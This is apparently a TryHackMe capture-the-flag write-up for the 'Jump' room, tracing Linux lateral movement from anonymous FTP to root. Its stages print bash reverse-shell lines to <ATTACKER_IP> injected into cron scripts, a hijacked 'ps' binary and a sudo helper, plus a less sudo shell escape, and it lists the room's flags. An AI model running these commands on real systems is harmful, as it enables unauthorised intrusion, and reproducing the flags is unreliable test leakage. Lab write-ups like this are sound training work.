---
layout: writeup
title: "Jump"
platform: "TryHackMe"
image: "/assets/images/jump_thm.png"
difficulty: "Easy"
date: 2026-09-14
description: "Lateral movement through a misconfigured Linux automation pipeline from anonymous FTP to root."
tags:
  - TryHackMe
  - Linux
  - FTP
  - Privilege Escalation
  - Lateral Movement
  - PATH Hijacking
  - Cron
  - GTFOBins
  - pspy
---

# Jump — TryHackMe Write-up

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Linux Privilege Escalation / Lateral Movement  
**Objective:** Escalate from anonymous FTP access to root across a chain of misconfigured user accounts

---

## Overview

The target runs an internal automation pipeline where four user accounts — `recon_user`, `dev_user`, `monitor_user`, and `ops_user` — each trust the previous one a little too much. Each stage hands off files or executes scripts owned by the account below it, creating a clean escalation chain:

```
anonymous (FTP) → recon_user → dev_user → monitor_user → ops_user → root
```

The misconfigurations here aren't exotic. They're the kind of thing that accumulates quietly in real environments: a writable script that a cron job runs, a PATH that wasn't locked down, a sudo rule that allows `less`. Each one is a small lapse. Together, they hand you root.

---

## Reconnaissance

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
```

Two services, two ways in. FTP is the entry point here — vsftpd 3.0.5 with anonymous login enabled.

---

## Stage 1 — Anonymous FTP → `recon_user`

Logging in as `anonymous` and browsing the FTP server reveals a `README.txt` in the `pub/` directory:

```
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

Something is watching the `incoming/` directory and executing files placed there. That's the entry point.

**Create a bash reverse shell:**

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

Start a listener, upload the shell script to `incoming/` via FTP, and wait a few seconds for the pipeline to pick it up.

```
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [10.49.128.245] 41248
recon_user@tryhackme-2404:~$
```

**Stabilize the shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

**Flag 1:**

```
recon_user@tryhackme-2404:~$ cat flag.txt
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
```

---

## Stage 2 — `recon_user` → `dev_user`

Checking group membership reveals that `recon_user` already belongs to the `dev_user` group:

```
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

Transfer `pspy64` to the machine to monitor what processes other users are running. After a short wait:

```
2026/09/14 13:49:01 CMD: UID=1002  PID=6836   | /bin/bash /opt/dev/backup.sh
```

`dev_user` (UID 1002) is running `/opt/dev/backup.sh` on a schedule. Inspecting the script:

```bash
cat /opt/dev/backup.sh
# #!/bin/bash
# tar -czf /tmp/recon_backup.tgz /home/recon_user
```

And checking permissions:

```
-rwxrwxr-x 1 dev_user dev_user 60 Jun  9 09:03 /opt/dev/backup.sh
```

The group has write access, and `recon_user` is in that group. Append a reverse shell to the script:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /opt/dev/backup.sh
```

When the scheduled job fires next, the appended line runs as `dev_user` and connects back.

**Flag 2:**

```
dev_user@tryhackme-2404:~$ cat flag.txt
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

---

## Stage 3 — `dev_user` → `monitor_user` (PATH Hijacking)

`pspy` shows `monitor_user` running a systemd service:

```
2026/09/14 14:23:32 CMD: UID=1003  PID=2357   | /bin/bash /usr/local/bin/healthcheck
```

The `healthcheck` script itself is straightforward — it runs `ps aux` in a loop. The interesting part is the service definition:

```ini
# /etc/systemd/system/healthcheck.service
[Service]
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

`/opt/dev/bin` comes first in the PATH — before `/usr/bin`. If that directory contains an executable named `ps`, it will run instead of the real one. Checking `/opt/dev/bin`:

```
-rwxrwxr-x 1 dev_user dev_user 108 Sep 14 15:07 ps
```

It's owned by `dev_user` and group-writable. Replace it with a reverse shell:

```bash
cat > /opt/dev/bin/ps << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4446 0>&1
EOF
chmod +x /opt/dev/bin/ps
```

**Why this works:**

When `healthcheck` calls `ps aux`, the system searches the PATH in order:

```
1. /opt/dev/bin/ps   ← malicious, found first
2. /usr/local/bin/ps
3. /usr/bin/ps
```

The service runs as `monitor_user`, so the shell it spawns inherits that identity.

```
systemd → healthcheck.service (monitor_user) → /usr/local/bin/healthcheck → ps aux → /opt/dev/bin/ps → reverse shell
```

**Flag 3:**

```
monitor_user@tryhackme-2404:~$ cat flag.txt
THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
```

---

## Stage 4 — `monitor_user` → `ops_user` (sudo + writable helper script)

```
monitor_user@tryhackme-2404:~$ sudo -l
User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

`monitor_user` can run `deploy.sh` as `ops_user` without a password. The script:

```bash
# /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

`deploy.sh` itself can't be modified (not owned by `monitor_user`), but the script it calls — `deploy_helper.sh` — can be:

```
-rwxr-xr-x 1 monitor_user monitor_user 90 Feb 2 2026 /opt/app/deploy_helper.sh
```

Append a reverse shell to `deploy_helper.sh`, then invoke the sudo rule:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4447 0>&1' >> /opt/app/deploy_helper.sh
sudo -u ops_user /usr/local/bin/deploy.sh
```

The escalation path:

```
monitor_user
  ↓ can modify
/opt/app/deploy_helper.sh
  ↑ called by
/usr/local/bin/deploy.sh
  ↑ sudo'd as ops_user
ops_user
```

**Flag 4:**

```
ops_user@tryhackme-2404:~$ cat flag.txt
THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}
```

---

## Stage 5 — `ops_user` → `root` (`less` GTFOBin)

```
ops_user@tryhackme-2404:~$ sudo -l
User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

`less` has an interactive mode that can spawn a shell. Since it's running as root here, so does anything it spawns.

```bash
sudo /usr/bin/less /etc/hosts
# Inside less, type:
!/bin/bash
```

This drops into a root shell. The `!/bin/bash` instruction tells `less` to execute `/bin/bash` — and because the process is owned by root, the shell inherits root privileges.

**Root Flag:**

```
root@tryhackme-2404:~# cat flag.txt
THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
```

---

## Summary

| Step | From | To | Vulnerability |
|------|------|----|---------------|
| 1 | anonymous | `recon_user` | FTP anonymous login + auto-executing incoming directory |
| 2 | `recon_user` | `dev_user` | Group write access on a cron-executed script |
| 3 | `dev_user` | `monitor_user` | PATH hijacking via writable directory early in service PATH |
| 4 | `monitor_user` | `ops_user` | sudo rule executes a script with a writable helper |
| 5 | `ops_user` | `root` | `less` GTFOBin via unrestricted sudo |

None of these are zero-days. They're all trust assumptions that weren't validated — each user trusting that the one below it won't tamper with shared resources. In a real environment, the fixes are straightforward: lock down file permissions, strip unnecessary group memberships, harden sudoers, and never put a writable directory ahead of system paths in a privileged service's `PATH`.

**Tools used:** `nmap`, `ftp`, `netcat`, `pspy64`
